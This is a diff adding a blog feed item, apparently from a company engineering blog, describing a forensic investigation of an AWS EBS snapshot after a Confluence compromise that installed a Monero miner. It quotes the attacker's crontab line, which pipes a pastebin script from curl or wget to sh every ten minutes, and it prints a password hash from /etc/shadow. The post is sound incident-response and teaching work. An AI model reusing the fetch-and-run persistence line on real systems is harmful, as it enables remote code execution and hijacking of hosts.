@@ -7,6 +7,181 @@
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Performing Digital Forensics on an AWS EBS Volume</title>
+        <description>&lt;p&gt;As a fellow Ops Engineer on the WebOps team here at Custom Ink I try to make InfoSEC a high priority and exercise &amp;#39;best practices&amp;#39; when it comes to building out Infrastructure. However, as you&amp;#39;re probably aware, ugh... &amp;#39;stuff&amp;#39; happens!  😜 This post will be a relatively deep dive into a &lt;em&gt;fairly&lt;/em&gt; recent compromise we experienced and details on conducting a digital forensics analysis on an AWS EBS volume.    &lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h1 id=&quot;setting-the-stage&quot;&gt;Setting the Stage&lt;/h1&gt;
+
+&lt;p&gt;So picture yourself as an Ops Engineer, head phones on, coffee mug full, happily hacking away on your &lt;a href=&quot;https://supermarket.chef.io/&quot;&gt;OpsChef cookbook&lt;/a&gt;. Then you happen to, out the corner of your eye, glance at your secondary monitor running Slack and see messages like &amp;quot;Confluence seems to be down&amp;quot;! Ugh... well that&amp;#39;s not good people use that!  😝 So headphones goes off and it&amp;#39;s time to enter, what I like to secretly call, &amp;#39;WebOps beast mode&amp;#39;! 😤&lt;/p&gt;
+
+&lt;p&gt;After logging into our Confluence instance we noticed a process with ~200% CPU utilization! After a quick Google search we hit an &lt;a href=&quot;https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html?_ga=2.84510736.880050261.1555700079-1786195807.1555006968&quot;&gt;Atlassian post&lt;/a&gt; describing a vulnerability in a couple Confluence plugins that were being exploited; resulting in the installation of some malware which installs a cryptocurrency miner!&lt;/p&gt;
+
+&lt;p&gt;So I did a &lt;em&gt;kill -9&lt;/em&gt; on this suspicious process. It immediately came back! After checking some crontabs I found an entry where a &lt;em&gt;very suspicious&lt;/em&gt; job was grabbing a script from pastebin! I recall thinking to myself &amp;#39;that&amp;#39;s not good&amp;#39;! I deleted this job from crontab and it immediately came back! At this point one thing was clear: &lt;strong&gt;Houston we have a problem!&lt;/strong&gt; 😒 &lt;/p&gt;
+
+&lt;h1 id=&quot;performing-digital-forensics-analysis-on-an-aws-ebs-volume&quot;&gt;Performing Digital Forensics Analysis on an AWS EBS Volume&lt;/h1&gt;
+
+&lt;h2 id=&quot;tools-used&quot;&gt;Tools Used&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://digital-forensics.sans.org/community/downloads&quot;&gt;SIFT&lt;/a&gt; ( SANS Investigative Forensics Toolkit )&lt;/p&gt;
+
+&lt;h2 id=&quot;evidence-gathering&quot;&gt;Evidence Gathering&lt;/h2&gt;
+
+&lt;h3 id=&quot;mount-ebs-vol-read-only&quot;&gt;Mount EBS vol. read-only.&lt;/h3&gt;
+
+&lt;p&gt;Note: I&amp;#39;m using a &lt;strong&gt;snapshot&lt;/strong&gt; of the originally compromised EBS volume and it&amp;#39;s mounted read-only on an EC2 instance where SIFT is installed.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:/# mkdir /mnt/disk1
+root@siftworkstation:~# mount -o ro /dev/xvdf1 /mnt/disk1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;run-a-clamav-virus-scan&quot;&gt;Run a &lt;a href=&quot;https://www.clamav.net/&quot;&gt;ClamAV&lt;/a&gt; virus scan&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# screen
+root@siftworkstation:~# cd /tmp
+root@siftworkstation:/tmp# clamscan --verbose --log=/var/log/virus-scan-compromised-ebs-inkernet --recursive=yes /mnt/disk1/
+----------- SCAN SUMMARY -----------
+Known viruses: 6108873
+Engine version: 0.100.3
+Scanned directories: 47853
+Scanned files: 112317
+Infected files: 0
+Data scanned: 9021.82 MB
+Data read: 20686.82 MB (ratio 0.44:1)
+Time: 7341.887 sec (122 m 21 s)
+Note: As of April 20, 2019 only 6 AntiVirus products have successfully detected this malware.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;search-for-know-indicators-of-compromise-via-loki&quot;&gt;Search for know indicators of compromise via &lt;a href=&quot;https://github.com/Neo23x0/Loki&quot;&gt;Loki&lt;/a&gt;.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:/tmp# cd /tmp/
+root@siftworkstation:/tmp# wget https://github.com/Neo23x0/Loki/archive/v0.29.2.tar.gz
+root@siftworkstation:/tmp# tar xf v0.29.2.tar.gz
+root@siftworkstation:/tmp# cd Loki-0.29.2
+root@siftworkstation:/tmp# python loki.py -p /mnt/disk1
+[INFO] Scanning /mnt/disk1 ...
+[NOTICE] Results: 0 alerts, 0 warnings, 6 notices
+[RESULT] SYSTEM SEEMS TO BE CLEAN.
+[NOTICE] Finished LOKI Scan SYSTEM: siftworkstation TIME: 20190417T00:55:56Z
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;check-cron-tab-for-anything-suspicious&quot;&gt;Check CRON tab for anything suspicious.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:# cat /mnt/disk1/etc/crontab
+root@siftworkstation:# ls /mnt/disk1/etc/cron.*
+root@siftworkstation:# find /mnt/disk1/var/spool/cron/* -exec cat {} \;
+*/10 * * * * (curl -fsSL https://pastebin.com/raw/wR3ETdbi||wget -q -O- https://pastebin.com/raw/wR3ETdbi)|sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;check-for-unusual-startup-scripts&quot;&gt;Check for unusual startup scripts.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# ls -als -t /mnt/disk1/etc/rc*.d/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;check-for-suspicious-files-in-tmp&quot;&gt;Check for suspicious files in /tmp.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# ls -alh /mnt/disk1/tmp/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;look-for-unusual-files-suid-set-none-found&quot;&gt;Look for unusual files ( SUID set ). None found.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# find /mnt/disk1/ -uid 0 -perm 4000 -print &amp;gt; /var/log/suid_inkernet_04_16.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;look-for-files-with-a-high-entropy&quot;&gt;Look for files with a high entropy.&lt;/h3&gt;
+
+&lt;p&gt;Note: This &lt;em&gt;could&lt;/em&gt; indicate a file that has been encrypted.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# densityscout -r -p 0.1 -l 0.1 -o /var/log/high_density_evidence.txt /mnt/disk1/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;review-root-users-bash-history-clean&quot;&gt;Review root user&amp;#39;s bash history. Clean.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat  /mnt/disk1/root/.bash_profile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;look-for-shell-accounts-with-passwords-set&quot;&gt;Look for shell accounts with passwords set.&lt;/h3&gt;
+
+&lt;p&gt;Note: This user is now using RSA key pairs for &lt;a href=&quot;https://www.openssh.com/&quot;&gt;SSH&lt;/a&gt; access and password removed from system.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat /mnt/disk1/etc/shadow |grep -F &quot;$&quot; &amp;gt; /var/log/users_with_passwords_inkernet_evidence.txt
+root@siftworkstation:~# cat /var/log/users_with_passwords_inkernet_evidence.txt
+user1:$6$BH2Vs.qf$WbCuhETLzkBDDJUIYU4.BA7.7ipyguhz7eaATrOMaqFH231kj/LDTJKXZwdhSzrW8VMQ4xuYz2zvkf6WTc7nh.:17835:0:99999:7:::
+root@siftworkstation:~# cat /mnt/disk1/etc/group |grep user1 
+sudo:x:27:ubuntu,user1
+user1:x:1011:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;get-a-list-of-boot-times-and-save-to-file-for-evidence&quot;&gt;Get a list of boot times and save to file for evidence.&lt;/h3&gt;
+
+&lt;p&gt;Note: /var/log/cloud-init.log should exist on the disk of all EC2 instances. A history of boot times is good to have so you know when this instances was on-line and rebooted.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# grep Cloud-init /mnt/disk1/var/log/cloud-init.log &amp;gt; /var/log/cloud-init-log.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;identify-past-ip-addresses-local-routing-table-of-instance&quot;&gt;Identify past Ip addresses &amp;amp; local routing table of instance.&lt;/h3&gt;
+
+&lt;p&gt;Note: A history of local Ip address is good to have when building a timeline.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# grep &quot;ci-info&quot; /mnt/disk1/var/log/cloud-init-output.log &amp;gt; /var/log/past-ips-evidence.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;identify-apt-dpkg-history&quot;&gt;Identify Apt &amp;amp; dpkg history.&lt;/h3&gt;
+
+&lt;p&gt;Note: Good to have a history of recently installed packages. &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# cat /mnt/disk1/var/log/apt/history.log &amp;gt; /var/log/apt-history-evidence.txt
+root@siftworkstation:~# cat /mnt/disk1/var/log/dpkg.log &amp;gt; /var/log/dpkg-log-evidence.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;perform-a-timeline-analysis-using-fls-and-mactime&quot;&gt;Perform a timeline analysis using &lt;a href=&quot;https://wiki.sleuthkit.org/index.php?title=Fls&quot;&gt;fls&lt;/a&gt; and &lt;a href=&quot;https://wiki.sleuthkit.org/index.php?title=Mactime&quot;&gt;mactime&lt;/a&gt;.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# fls -r -m / /dev/xvdf1 &amp;gt; /var/log/timeline-body.txt
+root@siftworkstation:~# mactime -b /var/log/timeline-body.txt -d &amp;gt; /var/log/timeline-evidence.csv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;recover-unallocated-space-and-sort-files&quot;&gt;Recover unallocated space and sort files.&lt;/h3&gt;
+
+&lt;p&gt;Note: This simple technique can be used to recover deleted files depending on specific compute environment and how/when a file was deleted.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# mkdir /var/log/unalocated_space_evidence_inkernet
+root@siftworkstation:~# tsk_recover /dev/xvdf1 /var/log/unalocated_space_evidence_inkernet
+Files Recovered: 83104
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;get-a-list-of-md5-hashes-of-regular-files&quot;&gt;Get a list of md5 hashes of regular files.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# find /mnt/disk1/ -type f -exec /usr/bin/md5sum {} \; &amp;gt; /var/log/inkernet-root-disk-hashes.md5
+cat inkernet-root-disk-hashes.md5 |awk '{ print $2 }' &amp;gt; /var/log/inkernet-root-disk-files-to-VT.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;get-file-list-of-main-system-binaries-save-to-disk&quot;&gt;Get file list of main system binaries &amp;amp; save to disk.&lt;/h3&gt;
+
+&lt;p&gt;Note: Only gathering md5 hashes for sytem binaries to submit to VirusTotal due to API rate limits on a free VirusTotal API key.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;cat inkernet-root-disk-files-to-VT.txt |grep -E '/mnt/disk1/bin|/mnt/disk1/sbin/mnt/disk1/usr/local/bin|/mnt/disk1/usr/bin|/mnt/dist1/usr/sbin' &amp;gt; inkernet-root-disk-binaries-to-VT.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;submit-hashes-to-virustotal&quot;&gt;Submit hashes to &lt;a href=&quot;https://www.virustotal.com/gui/home/upload&quot;&gt;VirusTotal&lt;/a&gt;.&lt;/h3&gt;
+
+&lt;p&gt;Note: After submitting your list of hashes to VirusTotal, and they are processed, you can login to your free account to see if that hash matched a hash of know malware.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;virustotal-submit.py -k api_key_here -f /var/log/inkernet-root-disk-binaries-to-VT.txt &amp;gt; /var/log/virustotal-results-inkernet-evidence.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;search-for-installed-rootkits-using-rkhunter&quot;&gt;Search for installed rootkits using &lt;a href=&quot;https://sourceforge.net/projects/rkhunter/&quot;&gt;rkhunter&lt;/a&gt;.&lt;/h3&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;root@siftworkstation:~# rkhunter --update
+root@siftworkstation:~# rkhunter --propupd
+root@siftworkstation:~# rkhunter -c  -l /var/log/rkhunter-scan-evidence.txt
+System checks summary
+=====================
+File properties checks...
+Files checked: 212
+Suspect files: 63
+Rootkit checks…
+Rootkits checked : 378
+Possible rootkits: 0
+Applications checks...
+All checks skipped
+The system checks took: 3 minutes and 31 seconds
+All results have been written to the log file: /var/log/rkhunter-scan-evidence.txt
+One or more warnings have been found while checking the system.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3 id=&quot;reverse-engineering-malware&quot;&gt;Reverse Engineering Malware&lt;/h3&gt;
+
+&lt;p&gt;I won&amp;#39;t go into much deatil here since the security firm Anomali has posted a detailed analysis of this exploit and associated malware &lt;a href=&quot;https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang&quot;&gt;here&lt;/a&gt;. However, I will note a few things.&lt;/p&gt;
+
+&lt;h2 id=&quot;crontab&quot;&gt;CRONTAB&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-&quot; data-lang=&quot;&quot;&gt;*/10 * * * * (curl -fsSL https://pastebin.com/raw/wR3ETdbi||wget -q -O- https://pastebin.com/raw/wR3ETdbi)|sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This cronjob was found in the the crontab of the user running Confluence. As you can see this job runs every 10 minutes and grabs a script from pastebin. The attackers are essentially using pastebin.com here for Command &amp;amp; Control. So all they have to do is update their pastbin to push out an update to their malware. Sadly, pretty smart when you think about it! 😒&lt;/p&gt;
+
+&lt;p&gt;I&amp;#39;ll also note they dropped in a SystemD config to ensure their Monero miner was always running. Yep, even cyber criminals can make use of SystemD to ensure their malware stays running! 😜 &lt;/p&gt;
+
+&lt;h2 id=&quot;noteworthy-items&quot;&gt;Noteworthy Items&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/guardduty/&quot;&gt;AWS GuardDuty&lt;/a&gt; showed &lt;strong&gt;high severity alerts 6 days prior&lt;/strong&gt; to Confluence going down! 🤔 We now have a CloudWatch event for high severity GuardDuty findings that notifies us via AWS &lt;a href=&quot;https://aws.amazon.com/sns/&quot;&gt;SNS&lt;/a&gt;. 😂&lt;/li&gt;
+&lt;li&gt;It would have been much more difficult to recover here without a &amp;#39;known good&amp;#39; snapshot.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;A long story short, our Confluence instance was compromised by an unpatched plugin, EC2 instance rebuilt from a &amp;#39;known good&amp;#39; snapshot, blameless postmortem conducted, and remediation items captured &amp;amp; resolved.&lt;/p&gt;
+
+&lt;p&gt;Stay safe out there! 😁&lt;/p&gt;
+</description>
+        <pubDate>Mon, 05 Aug 2019 00:00:00 -0400</pubDate>
+        <link>https://technology.customink.com//blog/2019/08/05/performing-digital-forensics-on-an-aws-ebs-volume/</link>
+        <guid isPermaLink="true">http://technology.customink.com//blog/2019/08/05/performing-digital-forensics-on-an-aws-ebs-volume/</guid>
+      </item>
+    
+      <item>
         <title>Integration Testing React Apps with Cypress</title>
         <description>&lt;h3 id=&quot;what-is-cypress&quot;&gt;What is Cypress?&lt;/h3&gt;
 
